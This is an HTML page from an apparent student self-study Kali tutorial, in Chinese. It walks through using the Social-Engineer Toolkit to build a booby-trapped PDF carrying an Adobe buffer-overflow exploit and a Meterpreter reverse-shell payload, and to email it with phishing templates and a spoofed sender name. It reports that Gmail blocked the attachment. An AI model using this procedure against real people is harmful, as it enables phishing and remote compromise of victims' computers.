@@ -1,0 +1,236 @@
+<html>
+<head>
+<title>Kali安全滲透-PDF監聽文件-2</title>
+<link rel="stylesheet" type="text/css" href="kali.css">
+<canvas id="cw"></canvas>
+<script type="text/javascript" src="Mouse_F.js"></script>
+</head>
+<body>
+<div id=main>
+<header>
+	<h1> Kali 安全滲透</h1> 
+</header>
+<aside>
+	<nav>
+	<img src="kali-linux-logo-.jpg" width="170">
+	<ul>
+	<li style="font-size:14pt;"><a href="Kali-home.htm">首頁</a></li>
+	<li style="list-style:circle"><h6>學習操作</h6></li>
+	<li><a href="Kali-passwd.htm">破解密碼</a></li>
+	<li><a href="Kali-disconnection.htm">強制斷線</a></li>
+	<li><a href="Kali-evilPDF.htm">PDF監聽文件-1</a></li>
+	<li><a href="Kali-evilPDF_2.htm">PDF監聽文件-2</a></li>
+	<li><a href="Kali-evilWeb.htm">Web監聽網頁</a></li>
+	<li style="list-style:circle"><h6>前置作業</h6></li>
+	<li><a href="">製作開機USB</a></li>
+	<li><a href="Kali-Group.htm">社群介紹</a></li>
+	</ul>
+	</nav>
+</aside>
+<article>
+	<section class="consection">
+	<h3>PDF監聽文件-2(此分兩章節)</h3>
+<fieldset>
+	<legend style="font-weight:bold; font-size:16pt;color:pink;">本次學習目標</legend>
+	<ul><li>自製監聽文件。-1</li>
+使用Metasploit中提供的滲透攻擊模塊-msfconsole，這個模塊不只可以創建PDF監聽檔、同時可滲透MySQL等。
+最終產出：一個監聽文件(.pdf檔)、一個接收文件(.pdf檔)。
+<li>仿造駭客發送方式，觀賞一下駭客模板。-2(此章節)</li>
+1.直接傳送 系統產出的監聽PDF 的電子郵件</br>
+2.傳送 自己產出的監聽文件 的電子郵件</br>
+最終產出：一個監聽文件(.pdf檔)。
+</ul>
+	</br>
+	</br>
+	課程寓意：了解監聽文件只需要幾個簡單的操作即可製作出來、效仿駭客傳送監聽文件的方式，順便嘲笑駭客模板(大誤)</br>
+</fieldset>
+</section>
+	<p style="text-align:center;">*有標示顏色者為系統輸出</p>
+	<p>一樣首先我們要先更變管理員權限</p>
+	<p class="code" style="color:#52008F	">01 ──(kali㉿kali)-[~]</p>
+	<p class="code">02 └─$ id kali </p>
+	<p style="text-indent: 4em">確認當前權限</p>
+	<p class="code">   uid=1000(kali) gid=1000(kali) groups=1000(kali), 4(adm), 20(dialout), 24(cdrom), 25(floppy), 27(sudo), 29(audio), 30(dip), 44(video), 46(plugdev), 109(netdev), 121(wireshark), 126(bluetooth), 138(scanner), 146(kaboxer)</p>
+	<p style="text-indent: 4em">前面的uid=1000，表示現在為普通用戶，需更改權限到root</p>
+	<p class="code" style="color:#52008F	">03 ──(kali㉿kali)-[~]</p>
+	<p class="code">04 └─$ sudo passwd root </p>
+	<p style="text-indent: 4em">設定密碼</p>
+	<p class="code">   New password: </p>
+	<p class="code">   Retype new password: </p>
+	<p class="code">   passwd: password updated successfully</p>
+	<p class="code" style="color:#52008F	">05 ──(kali㉿kali)-[~]</p>
+	<p class="code">06 └─$ su root </p>
+	<p class="code">   Password:</p>
+	<p class="code" style="color:#BD0000">07 ┌──(root㉿kali)-[/home/kali]</p>
+	<p style="text-indent: 4em">看到第7行呈現root㉿kali即成功更變權限</p>
+	<img class="style_Pic" src="Pic/2-1.png" width="780" >
+<hr/>
+	<ul><li><p style="font-size:14pt; color:pink;">社會工程學工具包(Social Engineer toolkit，簡稱:SET)</p>
+	<p style="color:pink;">是一款開源、Python驅動的社會工程學滲透測試工具，致力攻擊人們自身存在的弱點。使用此工具包可以傳遞攻擊連線到目標系統，進而收集目標系統的數據，並藉著長久建立後門，進行中間人攻擊。</p></li></ul>
+	<p style="color:#DDC8A3;">前置作業:</p>
+	<p style="text-indent: 4em;color:#DDC8A3;">將寄件者(你自己的電子郵件)的電子郵件設定裡，security中 低安全性應用程式存取權設定 改成on/啟用。才能順利發送郵件</p>	
+	<p style="font-size:14pt; color:#DDC8A3;">1.直接傳送 系統產出的監聽PDF 的電子郵件</p>
+	<p>我們將使用SET(社會工程學工具包)中提供的滲透模塊-setoolkit，來製作一個滲透電子郵件，並透過傳遞電子郵件建立連線來對目標對象進行滲透攻擊。</p>
+	<p>開啟setoolkit工具</p>
+	<p class="code">08 └─# setoolkit</p>
+	<p>第一次開啟時，會顯示操作...will only use this tool for lawful purposes only.等的條款(叫你不要亂用拿來做壞事巴拉巴拉)，送出y接受後即可進入SET。</p>
+	<p class="code" style="color:#BD0000">09 Do you agree to the terms of service [y/n]: </p>
+	<p class="code" >10 y</p>
+	<img class="style_Pic" src="Pic/340.jpeg" width="440" >
+	<ul><li style="list-style:circle; " >圖.340(站外截圖文末補網址) 會看到類似上圖的畫面(SET的創建者、版本號、代號、SET目錄，要進行開啟SET還是更新等)</li></ul>
+<hr/>
+	<p class="code" style="color:#BD0000">11 set> </p>
+	<p class="code">12 1 </p>
+	<p>選擇1，進入SET攻擊社會工程學</p>
+	<br/>
+	<img class="style_Pic" src="Pic/5-1.png" width="440" >
+	<img class="style_Pic" src="Pic/5-2.png" width="500" >
+	<ul><li style="list-style:circle" >圖5.1&5.2 會看到類似上兩圖的歡迎畫面(歡迎畫面每次進入都不同，只要有看見The Social-Engineer Toolit 即成功進入)</li></ul>
+	<p>可以看到SET的創建者、版本號、代號、工具目錄</p>
+	<p class="code" style="color:#BD0000">13 set> </p>
+	<p class="code">14  1</p>
+	<p>選擇1，進入SET攻擊社會工程學中的釣魚攻擊向量</p>
+	<img class="style_Pic" src="Pic/5-3.png" width="600" >
+	<ul><li style="list-style:circle" >圖5.3 列出釣魚攻擊向量中可用的模組</li></ul>
+	
+	<p>選擇大規模電子郵件攻擊</p>
+	<p class="code" style="color:#BD0000">15 set:phishing> </p>
+	<p class="code">16 1 </p>
+	<img class="style_Pic" src="Pic/5-4.png" width="600" >
+	<ul><li style="list-style:circle" >圖5.4 第10項是我們預計使用的監聽文件PDF模組</li></ul>
+	<p>此模組可以直接製成一個監聽的PDF檔案，並附錄在電子郵件後寄出</p>
+	<p class="code" style="color:#BD0000">17 set:payloads> </p>
+	<p class="code">18 10</p>
+	<p style="text-indent: 4em">使用Adobe Collab.collectEmailInfo Buffer Overflow 模組</p>
+	<hr/>
+	<img class="style_Pic" src="Pic/5-5.png" width="1000" >
+	<ul><li style="list-style:circle" >圖5.5 顯示要選擇Adobe PDF的哪個漏洞進行攻擊&&選擇後建置監聽文件所需的設定</li></ul>
+	<p>選擇2 針對Windows Meterpreter Reverse_TCP的漏洞</p>
+	<p class="code" style="color:#B80000">19 set:payloads></p>
+	<p class="code">20 2</p>
+	<p>會看到跟圖5.5下半部的畫面一樣，要求建置監聽文件所需的設定</p>
+	<p style="text-indent: 4em">先設置攻擊主機的位置(你的主機)，可能有兩種格式如下</p>
+	<p class="code" style="color:#BD0000">21 set>IP address for payload listener :xxxYourAddressIPxxx</p>
+	<p>/</p>
+	<p class="code" style="color:#BD0000">21 set>IP address or URL(www.ex.com) for payload listener (LHOST)[xxxYourAddressIPxxx]:</p>
+	<p>基本上電腦會幫你列好你IP位置，這裡直接按Enter即可(除非你想要設置別的主機作為攻擊主機)
+	<p style="text-indent: 4em">再來設置攻擊主機的端口(你的主機)</p>
+	<p class="code">22 set:payloads>Port to connect back on [XXX]:</p>
+	<p>這邊電腦一樣會幫你設置好，一樣按Enter(除非你想改別的端口)</p>
+	<p>以下為系統可能的輸出</p>
+	<p class="code" style="text-indent: 3em">[-] Defaulting to port 443…</p>
+	<p class="code" style="text-indent: 3em">[-] Generating fileformat exploit…</p>
+	<p class="code" style="text-indent: 3em">[*] Payload creation complete.</p>
+	<p class="code" style="text-indent: 3em">[*] All payloads get sent to the /root/.set/template.pdf directory</p>
+	<p class="code" style="text-indent: 3em">[-] As an added bonus, use the file-format creator in SET to create your attachment.</p>
+  	<p class="code" style="text-indent: 3em">Right now the attachment will be imported with filename of'template.whatever'</p>
+	<img class="style_Pic" src="Pic/5-6.png" width="1000" >
+	<ul><li style="list-style:circle" >圖5.6 建置監聽檔案的過程與是否要重新命名監聽檔案</li></ul>
+	<p class="code" style="color:#BD0000">23 set:phishing></p>
+	<p class="code">24 2</p>
+	<p style="text-indent: 4em">這邊如圖是有改監聽檔案的名稱(template.pdf➙isyou.pdf)，如果不想改這邊直接輸入 1</p>
+	</hr>
+	<p>更改完後會看到以下如圖5.7的上半部</p>
+	<img class="style_Pic" src="Pic/5-7.png" width="440" >
+	<ul><li style="list-style:circle" >圖5.7 選擇攻擊規模&&要不要使用郵件模板</li></ul>
+	<p>詢問你想攻擊一位還是多位郵件使用者，這邊選擇一位</p>
+	<p class="code" style="color:#BD0000">25 set:phishing></p>
+	<p class="code">26 1</p>
+	<p>詢問你要不要使用郵件模板(現成的釣魚文章)</p>
+	<p>這邊選擇要使用現成的模板</p>
+	<p class="code" style="color:#BD0000">27 set:phishing></p>
+	<p class="code">28 1</p>
+	<img class="style_Pic" src="Pic/5-8.png" width="440" >
+	<ul><li style="list-style:circle" >圖5.8 現成模板列出</li></ul>
+	<p>選擇喜歡的一個模板</p>
+<hr/>
+	<p>這邊選擇了第三個模板，接下來要設置欲攻擊對象的電子郵件(收件人)及資料</p>
+	<p class="code" style="color:#BD0000">29 set:phishing>Send email to :</p>
+	<p class="code">30  xxxxxxxx@gmail.com(自己設定)</p>
+	<img class="style_Pic" src="Pic/5-9.png" width="440" >
+	<ul><li style="list-style:circle" >圖5.9 設置目標電子郵件&&我方電子郵件</li></ul>
+	<p>選擇要用伺服器還是電子信項傳送監聽郵件</p>
+	<p>因為我們都沒有伺服器，所以選擇用電子郵件傳送 輸入 1，並設定要傳送電子郵件的電子信箱(寄件人)</p>
+	<p class="code" style="color:#BD0000">31 set:phishing></p>
+	<p class="code">32  1</p>
+	<p>輸入如圖5.10所需的資料，FROM NAME(寄信者設定的暱稱)沒設定的話會依原名顯示。</p>
+	<img class="style_Pic" src="Pic/5-10.png" width="440" >
+	<ul><li style="list-style:circle" >圖5.10 設置我方電子郵件&&輸入密碼及暱稱</li></ul>
+	<p>上幾行的輸入不做程式碼顯示(原程式碼33,34,35,36,37,38)</p>
+	<p class="code" style="color:#BD0000">39 set:phishing>Flag this message/s as high priority? :</p>
+	<p class="code">30 yes</p>
+	
+	<img class="style_Pic" src="Pic/5-11.png" width="440" >
+	<ul><li style="list-style:circle" >圖5.11 送出郵件&&獲得系統回報</li></ul>
+	<p>原以為會成功送出，結果卻顯示網路問題</p>
+	<p>所以這邊系統有問是否要Setup a listener時，請輸入no。(因為文件沒有被順利發送出去所以不用建立監聽)</p>
+	<p>目前有查找資料，發現近年(大約是2020年開始有這個問題)由於google的安全係數不斷提升，導致此模組無法順利附件監聽文件(我們測試過普通文件是可以的)，才會print網路問題(Internet Issues?)</p>
+	<hr/>
+	<p style="font-size:14pt; color:#DDC8A3;">2.傳送 自己產出的監聽文件 的電子郵件</p>	
+	<p>但由於在"1.直接傳送 系統產出的監聽PDF 的電子郵件"中研究得出監聽文件會無法成功附件在電子郵件中，所以是姑且嘗試並學習這部分。</p>
+	<p style="color:#DDC8A3;">前置作業:</p>
+	<p style="text-indent: 4em;color:#DDC8A3;">將寄件者(你自己的電子郵件)的電子郵件設定裡，security中 低安全性應用程式存取權設定 改成on/啟用。才能順利發送郵件</p>
+	<p style="font-size:14pt; color:pink;">情況1/</p>
+	<p> 如果你是接續"1.直接傳送 系統產出的監聽PDF 的電子郵件"一路做下來，將會看到下圖5.12。</p>
+	<img class="style_Pic" src="Pic/5-12.png" width="600" >
+	<ul><li style="list-style:circle" >圖5.12 系統回報沒有送出&&是否要執行其他操作</li></ul>
+	<p>輸入，回到工具目錄。</p>
+	<p style="font-size:14pt; color:pink;">情況2/</p>
+	<p> 如果你不是接續"1.直接傳送 系統產出的監聽PDF 的電子郵件"一路做下來，請先從本章節程式碼第1行做到第12行再回來此處(大約是圖5.2之前)。</p>
+	<img class="style_Pic" src="Pic/5-13.png" width="500" >
+	<ul><li style="list-style:circle" >圖5.13 工具目錄處(跟圖5.1&&圖5.2一樣)</li></ul>
+	<p style="text-indent: 3em; color:pink;">(以下不標行號，過程不複雜，皆指令類)</p>
+	<p>選擇Mass Mailer Attack</p>
+	<p class="code">set> 5</p>
+	<img class="style_Pic" src="Pic/5-14.png" width="500" >
+	<ul><li style="list-style:circle" >圖5.14 進入E-Mailer Attack</li></ul>
+	<p>一樣詢問你想攻擊一位還是多位郵件使用者，這邊選擇一位</p>
+	<p class="code">set:phishing> 1</p>
+	<img class="style_Pic" src="Pic/5-15.png" width="500" >
+	<ul><li style="list-style:circle" >圖5.15 E-Mailer Attack中的設定(模板、選擇模板)</li></ul>
+	<p>詢問你想要不要使用模板，選擇使用 輸入 1</p>
+	<p class="code">set:phishing> 1</p>
+	<p>使用第3個模板</p>
+	<p class="code">set:phishing> 3</p>
+	<img class="style_Pic" src="Pic/5-16.png" width="500" >
+	<ul><li style="list-style:circle" >圖5.16 電子郵件寄出設定</li></ul>
+	<p>設定收件者(欲攻擊的對象)</p>
+	<p class="code">set:phishing>Send email to :(設定收件者)</p>
+	<p>設定使用GMAIL帳號傳送電子郵件(方案1)</p>
+	<p class="code">set:phishing>1</p>
+	<p>設定寄件者(攻擊者)的電子信箱、FROM NAME(FROM NAME(寄信者設定的暱稱)沒設定的話會依原名顯示)、密碼</p>
+	<p class="code">set:phishing>Your gmail ...:(設定寄件者)</p>
+	<p class="code">set:phishing>From Name ...:(設定你暱稱)</p>
+	<p class="code">set:phishing>Email passwd ...:(設定寄件者)</p>
+	<p class="code">set:phishing>Flag this message/s as high priority? :yes</p>
+	<p>設定要不要附件文件、內連(內嵌)文件，這邊先設定不要附件，先確保郵件能正常寄出</p>
+	<p class="code">Do you want to attach a file :n</p>
+	<p class="code">Do you want to attach an inline file :n</p>
+	<img class="style_Pic" src="Pic/5-17.png" width="500" >
+	<ul><li style="list-style:circle" >圖5.17 電子郵件成功寄出</li></ul>
+	<br/>
+	<img class="style_Pic" src="Pic/G5-1.jpg" width="500" >
+	<ul><li style="list-style:circle" >圖G5-1 電子郵件畫面(僅文字的版本)</li></ul>
+	<br/>
+	<img class="style_Pic" src="Pic/G5-2.jpg" width="500" >
+	<ul><li style="list-style:circle" >圖G5-2 電子郵件畫面(附錄普通文件)</li></ul>
+	<p>設定要附件文件、不要內連(內嵌)文件，看看郵件能否正常寄出</p>
+	<p class="code">Do you want to attach a file :y</p>
+	<p class="code">Do you want to attach an inline file :n</p>
+	<img class="style_Pic" src="Pic/5-18.png" width="500" >
+	<ul><li style="list-style:circle" >圖5.18 電子郵件寄出失敗</li></ul>
+	<p style="color:pink;">意味著雖然Adobe的漏洞一直沒有解決，但google很認真的會防止有心人士寄出監聽文件(危害電腦的文件)寄出。
+<hr/>
+	<ul><li>2020年後SET模組無法繞過google的偵查文件系統進行監聽文件的傳遞</li></ul>
+	<ul><li>雖SET模組在監聽文件傳遞上受阻，但傳遞文件不留寄件備份及紀錄、能隨意更變暱稱等仍是一個強大的模組，只要能寫出一個可以不被google偵查到的監聽文件，依舊可以對不小心點開惡意文件者造成威脅。</li></ul>
+	<p><a href="https://www.kali.org/tools/set/">SET官網</a></p>
+	<p><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/38.html">圖340來源-大學霸Kali Linux</a></p>
+<p>本次學習結束</p>	
+<!--中文註解設計-->
+
+	</section>
+</article>
+<footer>最後更新時間:2022/05/29 製作110-2自主學習社群</footer>
+</div>
+</body>
+</html>
